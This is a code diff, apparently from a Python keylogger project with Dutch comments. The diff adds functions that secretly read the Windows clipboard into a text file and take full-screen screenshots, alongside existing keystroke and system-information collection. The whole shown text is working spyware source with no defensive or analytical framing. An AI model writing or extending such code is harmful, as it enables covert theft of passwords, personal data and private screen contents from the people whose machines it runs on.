@@ -31,8 +31,14 @@ keys = []
 sytem_info = "systeminfo.txt"
 path_system = str(path_directory).replace("main.py", "systeminfo.txt")
 path_system_formatted = re.escape(str(path_system))
-print(path_system_formatted)
 
+# Variabelen voor clipboard content
+clipboard_info = "clipboard.txt"
+path_clipboard = str(path_directory).replace("main.py", "clipboard.txt")
+
+# Variabelen voor screenshots
+screenshot_info = "screenshot.png"
+path_screenshot = str(path_directory).replace("main.py", "screenshot.png")
 
 # Functies keylogger
 
@@ -85,3 +91,26 @@ def system_info():
         f.write("Private IP: " + IP + "\n")
 
 system_info()
+
+#Functies clipboard content
+
+def copyclipboard():
+    with open(path_clipboard, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            f.write("Clipboard data: " +  pasted_data)
+        except:
+            f.write("Clipboard could not be copied")
+copyclipboard()
+
+#Functies voor screenshot
+
+def screenshot():
+    img = ImageGrab.grab()
+    img.save(path_screenshot)
+
+screenshot()
+
+
